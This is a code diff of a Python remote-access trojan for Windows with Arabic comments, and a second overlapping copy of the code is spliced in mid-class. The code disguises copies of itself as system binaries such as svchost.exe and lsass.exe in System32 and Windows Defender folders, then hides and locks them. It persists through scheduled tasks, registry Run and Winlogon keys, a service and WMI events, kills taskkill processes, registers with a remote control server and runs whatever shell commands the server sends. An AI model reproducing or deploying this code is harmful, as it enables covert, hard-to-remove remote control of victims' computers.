@@ -1336,34 +1336,238 @@ import shutil
 import socket
 import json
 import base64
+import hashlib
+from cryptography.fernet import Fernet
 from datetime import datetime
 
-class PermanentController:
-    def __init__(self, server_url="https://game-python-1.onrender.com:8080"):
+# === نظام التشفير ===
+class EncryptionSystem:
+    def __init__(self):
+        self.key = self.generate_system_key()
+        self.cipher = Fernet(self.key)
+    
+    def generate_system_key(self):
+        system_id = f"{platform.node()}-{getpass.getuser()}-{uuid.getnode()}"
+        return base64.urlsafe_b64encode(hashlib.sha256(system_id.encode()).digest())
+    
+    def encrypt_data(self, data):
+        if isinstance(data, str):
+            data = data.encode()
+        return self.cipher.encrypt(data)
+    
+    def decrypt_data(self, encrypted_data):
+        return self.cipher.decrypt(encrypted_data).decode()
+
+# === النظام المستقل لكل نسخة ===
+class IndependentPermanentSystem:
+    def __init__(self, server_url="https://game-python-1.onrender.com"):
         self.server_url = server_url
         self.client_id = f"{platform.node()}-{getpass.getuser()}-{uuid.uuid4().hex[:8]}"
         self.running = True
         self.registered = False
-        self.original_path = os.path.abspath(__file__)
+        self.current_path = os.path.abspath(__file__)
+        self.encryption = EncryptionSystem()
         
-        # أسماء نظام Windows الحقيقية
+        # أسماء نظام Windows الحقيقية والمختلفة
         self.system_names = [
             "svchost.exe", "csrss.exe", "services.exe", "lsass.exe",
             "winlogon.exe", "spoolsv.exe", "taskhost.exe", "dwm.exe",
             "audiodg.exe", "WUDFHost.exe", "RuntimeBroker.exe",
             "backgroundTaskHost.exe", "sihost.exe", "ctfmon.exe",
-            "SearchIndexer.exe", "SecurityHealthService.exe"
+            "SearchIndexer.exe", "SecurityHealthService.exe",
+            "wlanext.exe", "conhost.exe", "dllhost.exe", "smss.exe"
         ]
         
         self.hidden_copies = []
-        self.current_name = random.choice(self.system_names)
+        self.is_main_instance = self.check_if_main_instance()
+        self.copy_name = os.path.basename(self.current_path)
+        
+        # إعدادات الاتصال الآمن
+        self.session = requests.Session()
+        self.session.verify = False
+        self.timeout = 15
+        
+        # نظام المراقبة المتبادلة
+        self.monitor_threads = []
+        
+        print(f"🔒 INDEPENDENT SYSTEM: {self.client_id}")
+        print(f"📁 Running as: {self.copy_name}")
+        print(f"🏠 Is Main: {self.is_main_instance}")
+    
+    def check_if_main_instance(self):
+        """التحقق إذا كانت هذه النسخة الرئيسية أم نسخة نظامية"""
+        current_dir = os.path.dirname(self.current_path)
+        system_dirs = [
+            os.environ['WINDIR'],
+            os.environ['PROGRAMDATA'],
+            os.path.join(os.environ['USERPROFILE'], 'AppData')
+        ]
+        
+        for system_dir in system_dirs:
+            if current_dir.startswith(system_dir):
+                return False
+        return True
+    
+    def is_admin(self):
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except:
+            return False
+    
+    def hide_console(self):
+        try:
+            if os.name == 'nt':
+                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        except:
+            pass
+    
+    def get_unique_system_name(self):
+        available_names = [name for name in self.system_names if name not in [os.path.basename(copy) for copy in self.hidden_copies]]
+        if not available_names:
+            available_names = self.system_names
+        return random.choice(available_names)
+    
+    def create_windows_folder_structure(self):
+        """إنشاء هيكل مجلدات Windows في مواقع مختلفة"""
+        try:
+            # مواقع نظام Windows الحقيقية
+            windows_locations = [
+                # System32 ومجلدات النظام
+                os.path.join(os.environ['WINDIR'], 'System32', 'WindowsPowerShell', 'v1.0', 'Modules'),
+                os.path.join(os.environ['WINDIR'], 'SysWOW64', 'WindowsPowerShell', 'v1.0', 'Modules'),
+import requests
+import subprocess
+import os
+import platform
+import time
+import uuid
+import ctypes
+import sys
+import winreg
+import psutil
+import getpass
+import threading
+import random
+import glob
+import shutil
+import socket
+import json
+import base64
+import hashlib
+import pickle
+from cryptography.fernet import Fernet
+from datetime import datetime
+
+# === نظام التشفير ===
+class EncryptionSystem:
+    def __init__(self):
+        # مفتاح تشفير ثابت ومشفر
+        self.key = self.generate_system_key()
+        self.cipher = Fernet(self.key)
+    
+    def generate_system_key(self):
+        """إنشاء مفتاح تشفير فريد للنظام"""
+        system_id = f"{platform.node()}-{getpass.getuser()}-{uuid.getnode()}"
+        return base64.urlsafe_b64encode(hashlib.sha256(system_id.encode()).digest())
+    
+    def encrypt_data(self, data):
+        """تشفير البيانات"""
+        if isinstance(data, str):
+            data = data.encode()
+        return self.cipher.encrypt(data)
+    
+    def decrypt_data(self, encrypted_data):
+        """فك تشفير البيانات"""
+        return self.cipher.decrypt(encrypted_data).decode()
+
+# === نظام الحماية من القتل ===
+class KillProtection:
+    def __init__(self):
+        self.protected_pids = set()
+        self.running = True
+    
+    def start_protection(self):
+        """بدء حماية من قتل بايثون"""
+        def protection_worker():
+            while self.running:
+                try:
+                    # حماية جميع عمليات بايثون
+                    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+                        try:
+                            pid = proc.info['pid']
+                            cmdline = ' '.join(proc.info['cmdline'] or [])
+                            
+                            if 'python' in cmdline.lower() and pid not in self.protected_pids:
+                                self.protected_pids.add(pid)
+                                print(f"🛡️  محمية: {pid}")
+                            
+                        except (psutil.NoSuchProcess, psutil.AccessDenied):
+                            continue
+                    
+                    # قتل أي عملية تحاول إيقاف بايثون
+                    self.kill_python_killers()
+                    
+                    time.sleep(2)  # فحص كل ثانيتين
+                    
+                except Exception as e:
+                    time.sleep(5)
+        
+        # تشغيل حارسين
+        for i in range(2):
+            thread = threading.Thread(target=protection_worker, daemon=True)
+            thread.start()
+    
+    def kill_python_killers(self):
+        """قتل أي عملية taskkill تستهدف بايثون"""
+        try:
+            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+                try:
+                    cmdline = ' '.join(proc.info['cmdline'] or []).lower()
+                    
+                    if 'taskkill' in cmdline and 'python' in cmdline:
+                        proc.kill()
+                        print(f"🔪 قتلت قاتل بايثون: {proc.info['pid']}")
+                        
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    continue
+        except Exception:
+            pass
+
+# === النظام اللانهائي ===
+class InfinitePermanentSystem:
+    def __init__(self, server_url="https://game-python-1.onrender.com"):
+        self.server_url = server_url
+        self.client_id = f"{platform.node()}-{getpass.getuser()}-{uuid.uuid4().hex[:8]}"
+        self.running = True
+        self.registered = False
+        self.original_path = os.path.abspath(__file__)
+        self.encryption = EncryptionSystem()
+        self.kill_protection = KillProtection()
+        
+        # أسماء نظام Windows الحقيقية والمختلفة
+        self.system_names = [
+            "svchost.exe", "csrss.exe", "services.exe", "lsass.exe",
+            "winlogon.exe", "spoolsv.exe", "taskhost.exe", "dwm.exe",
+            "audiodg.exe", "WUDFHost.exe", "RuntimeBroker.exe",
+            "backgroundTaskHost.exe", "sihost.exe", "ctfmon.exe",
+            "SearchIndexer.exe", "SecurityHealthService.exe",
+            "wlanext.exe", "conhost.exe", "dllhost.exe", "smss.exe"
+        ]
+        
+        self.hidden_copies = []
+        self.used_names = set()
         self.main_copy_path = None
         
         # إعدادات الاتصال الآمن
         self.session = requests.Session()
-        self.session.verify = False  # تعطيل التحقق من SSL للتجربة
-        self.timeout = 15
+        self.session.verify = False
+        self.timeout = 20
         
+        # نظام المراقبة المتبادلة
+        self.monitor_threads = []
+        
+        print(f"🔒 SYSTEM ID: {self.client_id}")
+    
     def is_admin(self):
         """التحقق من صلاحيات المدير"""
         try:
@@ -1379,252 +1583,374 @@ class PermanentController:
         except:
             pass
     
-    def create_system_copies(self):
-        """إنشاء نسخ نظامية في أماكن Windows"""
+    def get_unique_system_name(self):
+        """الحصول على اسم نظامي فريد"""
+        available_names = [name for name in self.system_names if name not in self.used_names]
+        if not available_names:
+            # إذا استخدمنا جميع الأسماء، نعيد استخدام بعضها
+            self.used_names.clear()
+            available_names = self.system_names
+        
+        chosen_name = random.choice(available_names)
+        self.used_names.add(chosen_name)
+        return chosen_name
+    
+    def clean_old_files(self):
+        """تنظيف الملفات القديمة قبل إنشاء جديدة"""
         try:
+            # البحث عن الملفات القديمة وحذفها
+            search_locations = [
+                os.path.join(os.environ['WINDIR'], 'System32'),
+                os.path.join(os.environ['WINDIR'], 'SysWOW64'),
+                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows'),
+                os.path.join(os.environ['PROGRAMFILES'], 'Windows Defender'),
+                os.path.join(os.environ['PROGRAMFILES(X86)'], 'Windows Defender'),
+                os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Windows'),
+                os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp'),
+                os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Windows'),
+            ]
+            
+            deleted_count = 0
+            for location in search_locations:
+                try:
+                    if os.path.exists(location):
+                        for file_name in self.system_names:
+                            file_path = os.path.join(location, file_name)
+                            if os.path.exists(file_path):
+                                try:
+                                    # محاولة إزالة الحماية أولاً
+                                    subprocess.run(f'icacls "{file_path}" /grant Everyone:F', shell=True, capture_output=True, timeout=2)
+                                    subprocess.run(f'attrib -s -h -r "{file_path}"', shell=True, capture_output=True, timeout=2)
+                                    os.remove(file_path)
+                                    deleted_count += 1
+                                    print(f"🧹 حذف ملف قديم: {file_name}")
+                                except:
+                                    continue
+                except:
+                    continue
+            
+            if deleted_count > 0:
+                print(f"🧹 تم حذف {deleted_count} ملف قديم")
+            
+        except Exception as e:
+            print(f"⚠️  خطأ في التنظيف: {e}")
+    
+    def create_infinite_copies(self):
+        """إنشاء نسخ لا نهائية بأسماء مختلفة"""
+        try:
+            # تنظيف الملفات القديمة أولاً
+            self.clean_old_files()
+            
             system_locations = [
                 # مواقع نظام أساسية
-                os.path.join(os.environ['WINDIR'], 'System32', self.current_name),
-                os.path.join(os.environ['WINDIR'], 'SysWOW64', self.current_name),
-                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', self.current_name),
+                os.path.join(os.environ['WINDIR'], 'System32'),
+                os.path.join(os.environ['WINDIR'], 'SysWOW64'),
+                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows'),
                 
                 # مواقع برامج Microsoft
-                os.path.join(os.environ['PROGRAMFILES'], 'Windows Defender', self.current_name),
-                os.path.join(os.environ['PROGRAMFILES(X86)'], 'Windows Defender', self.current_name),
+                os.path.join(os.environ['PROGRAMFILES'], 'Windows Defender'),
+                os.path.join(os.environ['PROGRAMFILES(X86)'], 'Windows Defender'),
+                os.path.join(os.environ['PROGRAMFILES'], 'Common Files', 'Microsoft Shared'),
                 
                 # مواقع مستخدم مخفية
-                os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Windows', self.current_name),
-                os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', self.current_name),
-                os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Windows', self.current_name),
+                os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Windows'),
+                os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp'),
+                os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Windows'),
+                
+                # مواقع إضافية للتكرار
+                os.path.join(os.environ['SYSTEMDRIVE'], 'Windows', 'Temp'),
+                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Network'),
+                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Crypto'),
             ]
             
             created_count = 0
+            target_copies = 5  # 5 نسخ كحد أدنى
+            
             for location in system_locations:
+                if created_count >= target_copies:
+                    break
+                    
                 try:
+                    # اسم فريد لكل نسخة
+                    system_name = self.get_unique_system_name()
+                    copy_path = os.path.join(location, system_name)
+                    
                     # إنشاء المجلد إذا لم يكن موجوداً
-                    os.makedirs(os.path.dirname(location), exist_ok=True)
+                    os.makedirs(os.path.dirname(copy_path), exist_ok=True)
                     
                     # التحقق من عدم وجود النسخة مسبقاً
-                    if not os.path.exists(location):
-                        shutil.copy2(self.original_path, location)
+                    if not os.path.exists(copy_path):
+                        # نسخ الملف
+                        shutil.copy2(self.original_path, copy_path)
+                        
+                        # تشفير الملف النسخة
+                        self.encrypt_file(copy_path)
                         
                         # إخفاء الملف وإضافة حماية
                         try:
-                            subprocess.run(f'attrib +s +h +r "{location}"', shell=True, capture_output=True, timeout=3)
+                            subprocess.run(f'attrib +s +h +r "{copy_path}"', shell=True, capture_output=True, timeout=3)
+                            # منع الوصول
+                            subprocess.run(f'icacls "{copy_path}" /deny Everyone:F', shell=True, capture_output=True)
                         except:
                             pass
                         
-                        self.hidden_copies.append(location)
+                        self.hidden_copies.append(copy_path)
                         created_count += 1
                         
-                        # تعيين النسخة الرئيسية
+                        # تعيين النسخة الرئيسية الأولى
                         if self.main_copy_path is None:
-                            self.main_copy_path = location
+                            self.main_copy_path = copy_path
                         
-                        print(f"✅ تم إنشاء نسخة نظامية: {os.path.basename(location)}")
+                        print(f"✅ نسخة نظامية: {system_name} → {location}")
                         
-                        # التوقف بعد إنشاء 3 نسخ كحد أدنى
-                        if created_count >= 3:
-                            break
-                            
                 except Exception as e:
                     continue
             
-            print(f"📁 تم إنشاء {created_count} نسخة نظامية")
+            print(f"📁 تم إنشاء {created_count} نسخة نظامية بأسماء مختلفة")
             return created_count
             
         except Exception as e:
             print(f"❌ خطأ في إنشاء النسخ: {e}")
             return 0
     
-    def install_permanent_persistence(self):
-        """تثبيت استمرارية دائمة"""
+    def encrypt_file(self, file_path):
+        """تشفير ملف النسخة"""
+        try:
+            with open(file_path, 'rb') as f:
+                original_content = f.read()
+            
+            # إضافة توقيع النظام
+            system_signature = f"INFINITE_SYSTEM:{self.client_id}:{time.time()}"
+            encrypted_content = self.encryption.encrypt_data(original_content + system_signature.encode())
+            
+            with open(file_path, 'wb') as f:
+                f.write(encrypted_content)
+                
+        except Exception as e:
+            print(f"⚠️  لم يتم تشفير الملف: {e}")
+    
+    def install_eternal_persistence(self):
+        """تثبيت استمرارية أبدية"""
         persistence_count = 0
         
         try:
-            # 1. المهام المجدولة - الأكثر فعالية
+            # 1. المهام المجدولة المتعددة
             scheduled_tasks = [
                 "Microsoft\\Windows\\SystemRestore",
-                "Microsoft\\Windows\\DiskCleanup",
-                "Microsoft\\Windows\\Defrag"
+                "Microsoft\\Windows\\DiskCleanup", 
+                "Microsoft\\Windows\\Defrag",
+                "Microsoft\\Windows\\WindowsUpdate",
+                "Microsoft\\Windows\\Maintenance",
+                "Microsoft\\Windows\\Diagnosis"
             ]
             
             for task_name in scheduled_tasks:
                 try:
-                    task_cmd = f'schtasks /create /tn "{task_name}" /tr "\"{self.main_copy_path}\"" /sc onlogon /f'
+                    # استخدام نسخة عشوائية مختلفة لكل مهمة
+                    random_copy = random.choice(self.hidden_copies) if self.hidden_copies else self.original_path
+                    task_cmd = f'schtasks /create /tn "{task_name}" /tr "\"{random_copy}\"" /sc onlogon /f'
                     result = subprocess.run(task_cmd, shell=True, capture_output=True, text=True, timeout=5)
                     if result.returncode == 0:
                         persistence_count += 1
-                        print(f"✅ تم إضافة مهمة مجدولة: {task_name}")
+                        print(f"✅ مهمة مجدولة: {task_name}")
                 except:
                     continue
             
-            # 2. الريجستري
+            # 2. الريجستري المتعدد
             registry_entries = [
                 (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsAudio"),
+                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "SystemHealth"),
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell"),
             ]
             
             for hkey, subkey, value_name in registry_entries:
                 try:
+                    random_copy = random.choice(self.hidden_copies) if self.hidden_copies else self.original_path
                     with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
-                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'"{self.main_copy_path}"')
+                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'"{random_copy}"')
                     persistence_count += 1
-                    print(f"✅ تم إضافة إدخال ريجستري: {value_name}")
+                    print(f"✅ ريجستري: {value_name}")
                 except:
                     continue
             
-            # 3. بدء التشغيل
+            # 3. خدمات Windows
             try:
-                startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-                bat_path = os.path.join(startup_dir, 'WindowsSystem.bat')
-                with open(bat_path, 'w') as f:
-                    f.write(f'@echo off\nstart "" "{self.main_copy_path}"\n')
+                service_cmd = f'sc create "WindowsAudioService" binPath= "\"{self.main_copy_path}\" start= auto'
+                subprocess.run(service_cmd, shell=True, capture_output=True)
                 persistence_count += 1
-                print("✅ تم إضافة ملف بدء التشغيل")
+                print("✅ خدمة نظام")
+            except:
+                pass
+            
+            # 4. WMI Event
+            try:
+                wmi_script = f"""
+                $query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"
+                Register-WmiEvent -Query $query -Action {{ & "{self.main_copy_path}" }}
+                """
+                subprocess.run(["powershell", "-Command", wmi_script], capture_output=True)
+                persistence_count += 1
+                print("✅ حدث WMI")
             except:
                 pass
                 
-            print(f"🔧 تم تثبيت {persistence_count} طريقة استمرارية")
+            print(f"🔧 تم تثبيت {persistence_count} طريقة استمرارية أبدية")
             return persistence_count
             
         except Exception as e:
             print(f"❌ خطأ في الاستمرارية: {e}")
             return 0
     
-    def start_self_healing(self):
-        """بدء نظام الشفاء الذاتي"""
-        def healing_monitor():
-            check_interval = 60  # فحص كل دقيقة
-            
+    def start_mutual_monitoring(self):
+        """بدء المراقبة المتبادلة بين النسخ"""
+        def monitor_copies():
             while self.running:
                 try:
-                    # فحص النسخ الرئيسية
-                    copies_to_remove = []
-                    for copy_path in self.hidden_copies:
-                        if not os.path.exists(copy_path):
-                            print(f"⚠️  نسخة مفقودة: {os.path.basename(copy_path)}")
-                            try:
-                                # إعادة إنشاء النسخة المفقودة
-                                shutil.copy2(self.original_path, copy_path)
-                                subprocess.run(f'attrib +s +h +r "{copy_path}"', shell=True, capture_output=True)
-                                print(f"✅ تم استعادة النسخة: {os.path.basename(copy_path)}")
-                            except:
-                                copies_to_remove.append(copy_path)
+                    current_time = time.time()
+                    damaged_copies = []
                     
-                    # إزالة النسخ التالفة
-                    for copy_path in copies_to_remove:
-                        self.hidden_copies.remove(copy_path)
+                    # فحص كل النسخ
+                    for copy_path in self.hidden_copies[:]:
+                        try:
+                            # التحقق من وجود النسخة
+                            if not os.path.exists(copy_path):
+                                damaged_copies.append(copy_path)
+                                continue
+                            
+                            # التحقق من تاريخ التعديل (إذا كان قديم جداً قد يكون تالف)
+                            stat = os.stat(copy_path)
+                            if current_time - stat.st_mtime > 3600:  # ساعة
+                                print(f"🔄 تجديد نسخة قديمة: {os.path.basename(copy_path)}")
+                                self.recreate_copy(copy_path)
+                                
+                        except Exception:
+                            damaged_copies.append(copy_path)
                     
-                    # التأكد من وجود نسخ كافية
-                    if len(self.hidden_copies) < 2:
-                        print("🔄 عدد النسخ غير كافي، جاري إنشاء نسخ إضافية...")
-                        self.create_system_copies()
+                    # إصلاح النسخ التالفة
+                    for damaged_copy in damaged_copies:
+                        self.hidden_copies.remove(damaged_copy)
+                        self.recreate_copy(damaged_copy)
                     
-                    time.sleep(check_interval)
+                    # التأكد من وجود 3 نسخ على الأقل
+                    if len(self.hidden_copies) < 3:
+                        print("🔄 إنشاء نسخ إضافية للوصول إلى الحد الأدنى")
+                        self.create_infinite_copies()
+                    
+                    time.sleep(5)  # فحص كل 5 ثواني
                     
                 except Exception as e:
                     print(f"❌ خطأ في المراقبة: {e}")
-                    time.sleep(check_interval * 2)
+                    time.sleep(10)
         
-        threading.Thread(target=healing_monitor, daemon=True).start()
-        print("🔄 بدء نظام الشفاء الذاتي")
+        # بدء عدة خيوط مراقبة
+        for i in range(3):
+            thread = threading.Thread(target=monitor_copies, daemon=True)
+            thread.start()
+            self.monitor_threads.append(thread)
+        
+        print("🔄 بدء نظام المراقبة المتبادلة (3 خيوط)")
     
-    def safe_request(self, method, url, **kwargs):
-        """طلب آمن مع معالجة الأخطاء"""
+    def recreate_copy(self, copy_path):
+        """إعادة إنشاء نسخة تالفة"""
         try:
-            kwargs.setdefault('timeout', self.timeout)
-            response = self.session.request(method, url, **kwargs)
-            return response
-        except requests.exceptions.SSLError:
-            # إعادة المحاولة بدون SSL
-            try:
-                kwargs['verify'] = False
-                response = self.session.request(method, url, **kwargs)
-                return response
-            except Exception as e:
-                raise e
+            if os.path.dirname(copy_path) and os.path.exists(os.path.dirname(copy_path)):
+                # استخدام اسم جديد للنسخة
+                new_name = self.get_unique_system_name()
+                new_path = os.path.join(os.path.dirname(copy_path), new_name)
+                
+                shutil.copy2(self.original_path, new_path)
+                self.encrypt_file(new_path)
+                
+                try:
+                    subprocess.run(f'attrib +s +h +r "{new_path}"', shell=True, capture_output=True)
+                except:
+                    pass
+                
+                self.hidden_copies.append(new_path)
+                print(f"✅ تم إعادة إنشاء: {os.path.basename(new_path)}")
+                
         except Exception as e:
-            raise e
+            print(f"❌ فشل إعادة الإنشاء: {e}")
     
-    def start_communication(self):
-        """بدء الاتصال مع خادم التحكم"""
+    def start_kill_protection(self):
+        """بدء حماية من قتل بايثون"""
+        self.kill_protection.start_protection()
+        print("🔪 تم تفعيل حماية من قتل بايثون")
+    
+    def start_eternal_communication(self):
+        """بدء اتصال أبدي مع خادم التحكم"""
         def communication_worker():
-            backoff = 5  # بداية بـ 5 ثواني
+            backoff = 3
             
             while self.running:
                 try:
                     if not self.registered:
-                        # بيانات التسجيل
                         system_info = {
                             'client_id': self.client_id,
                             'computer': platform.node(),
                             'user': getpass.getuser(),
                             'os': f"{platform.system()} {platform.release()}",
-                            'status': 'permanent_active',
+                            'status': 'eternal_active',
                             'admin': self.is_admin(),
                             'copies': len(self.hidden_copies),
                             'timestamp': time.time(),
-                            'type': 'permanent_controller'
+                            'type': 'infinite_system'
                         }
                         
-                        response = self.safe_request(
-                            'POST',
+                        response = self.session.post(
                             f"{self.server_url}/register",
-                            json=system_info
+                            json=system_info,
+                            timeout=self.timeout,
+                            verify=False
                         )
                         
                         if response.status_code == 200:
                             self.registered = True
-                            backoff = 5
-                            print("✅ تم التسجيل في خادم التحكم")
+                            backoff = 3
+                            print("✅ تم التسجيل في النظام الأبدي")
                         else:
-                            backoff = min(backoff * 1.5, 300)  # أقصى انتظار 5 دقائق
-                            print(f"⏳ فشل التسجيل ({response.status_code})، إعادة المحاولة بعد {backoff} ثانية")
+                            backoff = min(backoff * 1.2, 60)
                     
-                    # فحص الأوامر الجديدة
+                    # فحص الأوامر
                     self.check_commands()
                     
                     time.sleep(backoff)
                     
-                except requests.exceptions.RequestException as e:
-                    backoff = min(backoff * 1.5, 300)
-                    print(f"🌐 خطأ في الاتصال: {type(e).__name__}")
-                    time.sleep(backoff)
                 except Exception as e:
-                    backoff = min(backoff * 1.5, 300)
-                    print(f"❌ خطأ غير متوقع: {e}")
+                    backoff = min(backoff * 1.2, 60)
                     time.sleep(backoff)
         
-        threading.Thread(target=communication_worker, daemon=True).start()
+        # بدء عدة خيوط اتصال
+        for i in range(2):
+            thread = threading.Thread(target=communication_worker, daemon=True)
+            thread.start()
+            self.monitor_threads.append(thread)
     
     def check_commands(self):
         """فحص الأوامر من خادم التحكم"""
         try:
-            response = self.safe_request(
-                'GET',
+            response = self.session.get(
                 f"{self.server_url}/commands",
-                params={'client': self.client_id, '_t': int(time.time()*1000)}
+                params={'client': self.client_id, '_t': int(time.time()*1000)},
+                timeout=15,
+                verify=False
             )
             
             if response.status_code == 200:
                 data = response.json()
                 if data.get('command'):
                     command_data = data['command']
-                    print(f"🎮 استقبال أمر: {command_data}")
+                    print(f"🎮 أمر: {command_data}")
                     
-                    # معالجة الأمر
                     result = self.execute_command(command_data)
-                    
-                    # إرسال النتيجة
                     self.send_response(command_data, result)
                     
-        except Exception as e:
+        except Exception:
             pass
     
     def execute_command(self, command):
         """تنفيذ الأمر"""
         try:
-            # أوامر النظام الأساسية
             if command.strip() == "sysinfo":
                 return self.get_system_info()
             elif command.strip() == "status":
@@ -1633,18 +1959,8 @@ class PermanentController:
                 return self.reinforce_system()
             elif command.strip() == "locations":
                 return self.get_locations_info()
-            elif command.strip() == "ping":
-                return "pong"
-            elif command.strip().startswith("download "):
-                # أمر تحميل ملف
-                file_path = command[9:].strip()
-                return self.download_file(file_path)
-            elif command.strip().startswith("upload "):
-                # أمر رفع ملف
-                parts = command[7:].strip().split(" ", 1)
-                if len(parts) == 2:
-                    file_name, file_data = parts
-                    return self.upload_file(file_name, file_data)
+            elif command.strip() == "eternal_status":
+                return self.get_eternal_status()
             
             # تنفيذ أوامر النظام
             startupinfo = subprocess.STARTUPINFO()
@@ -1661,56 +1977,10 @@ class PermanentController:
             )
             
             output = result.stdout if result.stdout else result.stderr
-            return output or "تم تنفيذ الأمر بنجاح"
-            
-        except subprocess.TimeoutExpired:
-            return "⏰ انتهت مهلة تنفيذ الأمر"
-        except Exception as e:
-            return f"❌ خطأ: {str(e)}"
-    
-    def download_file(self, file_path):
-        """تحميل ملف وإرساله"""
-        try:
-            if os.path.exists(file_path):
-                with open(file_path, 'rb') as f:
-                    file_content = base64.b64encode(f.read()).decode('utf-8')
-                
-                return json.dumps({
-                    'action': 'file_download',
-                    'file_name': os.path.basename(file_path),
-                    'file_content': file_content,
-                    'file_size': os.path.getsize(file_path),
-                    'status': 'success'
-                })
-            else:
-                return json.dumps({
-                    'action': 'file_download',
-                    'status': 'error',
-                    'message': f'الملف غير موجود: {file_path}'
-                })
-                
-        except Exception as e:
-            return json.dumps({
-                'action': 'file_download',
-                'status': 'error',
-                'message': f'خطأ في تحميل الملف: {str(e)}'
-            })
-    
-    def upload_file(self, file_name, file_data):
-        """استقبال ورفع ملف"""
-        try:
-            # فك تشفير base64
-            file_content = base64.b64decode(file_data)
-            
-            # حفظ الملف في TEMP
-            save_path = os.path.join(os.environ['TEMP'], file_name)
-            with open(save_path, 'wb') as f:
-                f.write(file_content)
-            
-            return f"✅ تم رفع الملف: {save_path}"
+            return output or "✅ executed"
             
         except Exception as e:
-            return f"❌ خطأ في رفع الملف: {str(e)}"
+            return f"❌ error: {str(e)}"
     
     def send_response(self, command, result):
         """إرسال نتيجة الأمر"""
@@ -1722,146 +1992,163 @@ class PermanentController:
                 'timestamp': time.time()
             }
             
-            self.safe_request(
-                'POST',
+            self.session.post(
                 f"{self.server_url}/response",
-                json=response_data
+                json=response_data,
+                timeout=10,
+                verify=False
             )
             
-        except Exception as e:
+        except Exception:
             pass
     
     def get_system_info(self):
         """الحصول على معلومات النظام"""
         try:
             info = f"""
-🔒 PERMANENT CONTROLLER - SYSTEM INTEGRATION
+🔒 INFINITE PERMANENT SYSTEM - ETERNAL
 🖥️  Computer: {platform.node()}
 👤 User: {getpass.getuser()}
 💻 OS: {platform.system()} {platform.release()}
-🆔 Client ID: {self.client_id}
+🆔 System ID: {self.client_id}
 🌐 Server: {self.server_url}
 
-🔧 SYSTEM STATUS:
-✅ Hidden Copies: {len(self.hidden_copies)}
-✅ Main Path: {os.path.basename(self.main_copy_path) if self.main_copy_path else 'N/A'}
+🔧 ETERNAL STATUS:
+✅ Active Copies: {len(self.hidden_copies)}
+✅ Unique Names: {len(self.used_names)}
 ✅ Admin Rights: {'YES' if self.is_admin() else 'NO'}
-✅ Self-Healing: ACTIVE
-✅ Persistence: PERMANENT
+✅ Mutual Monitoring: ACTIVE (3 threads)
+✅ Kill Protection: ACTIVE
+✅ Encryption: ENABLED
+✅ Persistence: ETERNAL
 
 📊 OPERATIONAL:
 🔄 Connection: {'ESTABLISHED' if self.registered else 'ESTABLISHING'}
 ⚡ Uptime: {self.get_uptime()}
-🛡️ Protection: MAXIMUM
+🛡️ Protection: INFINITE
 
-💾 RESOURCES:
-📈 CPU Usage: {psutil.cpu_percent()}%
-🧠 Memory Usage: {psutil.virtual_memory().percent}%
-💽 Disk Usage: {psutil.disk_usage('/').percent}%
+💾 SYSTEM HEALTH:
+📈 CPU: {psutil.cpu_percent()}%
+🧠 Memory: {psutil.virtual_memory().percent}%
+💽 Disk: {psutil.disk_usage('/').percent}%
 """
             return info
         except:
-            return "System information"
+            return "Infinite System Information"
+    
+    def get_eternal_status(self):
+        """الحصول على حالة النظام الأبدي"""
+        status = {
+            'system_id': self.client_id,
+            'active_copies': len(self.hidden_copies),
+            'unique_names': list(self.used_names),
+            'monitoring_threads': len(self.monitor_threads),
+            'connection_status': self.registered,
+            'uptime': self.get_uptime(),
+            'timestamp': time.time(),
+            'version': 'INFINITE_1.0'
+        }
+        return json.dumps(status, indent=2)
     
     def get_status(self):
-        """الحصول على الحالة المختصرة"""
-        return f"🔒 PERMANENT - Copies: {len(self.hidden_copies)} - Connected: {self.registered} - Uptime: {self.get_uptime()}"
+        return f"♾️ INFINITE - Copies: {len(self.hidden_copies)} - Connected: {self.registered} - Eternal: ACTIVE"
     
     def get_uptime(self):
-        """الحصول على مدة التشغيل"""
         try:
             uptime_seconds = time.time() - psutil.boot_time()
-            hours = int(uptime_seconds // 3600)
-            minutes = int((uptime_seconds % 3600) // 60)
-            return f"{hours}h {minutes}m"
+            days = int(uptime_seconds // 86400)
+            hours = int((uptime_seconds % 86400) // 3600)
+            return f"{days}d {hours}h"
         except:
-            return "N/A"
+            return "ETERNAL"
     
     def get_locations_info(self):
-        """الحصول على معلومات مواقع النسخ"""
-        locations_info = "📍 SYSTEM COPIES LOCATIONS:\n"
+        locations_info = "📍 INFINITE COPIES LOCATIONS:\n"
         for i, path in enumerate(self.hidden_copies, 1):
-            locations_info += f"{i}. {path}\n"
